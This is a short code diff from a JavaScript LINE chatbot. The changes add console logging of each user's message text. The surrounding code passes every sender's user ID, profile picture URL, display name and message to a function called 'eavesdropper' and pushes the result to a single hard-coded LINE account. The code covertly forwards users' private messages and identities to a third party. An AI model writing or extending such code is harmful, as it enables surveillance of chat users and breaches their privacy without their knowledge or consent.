@@ -83,11 +83,12 @@ module.exports = class LineBot {
     }
 
     let chatId = this.getChatId(message);
-    let messageText = this.getText(message);
+    var messageText = this.getText(message);
 
     this.getProfile(chatId)
     .then((data) => {
       console.log(data);
+      console.log('user says : ' + messageText);
       const liyomessage = eroFunction.eavesdropper(data.userId, data.pictureUrl, data.displayName, messageText)
       this.replyPush('U506c7426ba192e705210a874b97b40ca',[liyomessage]);
     })
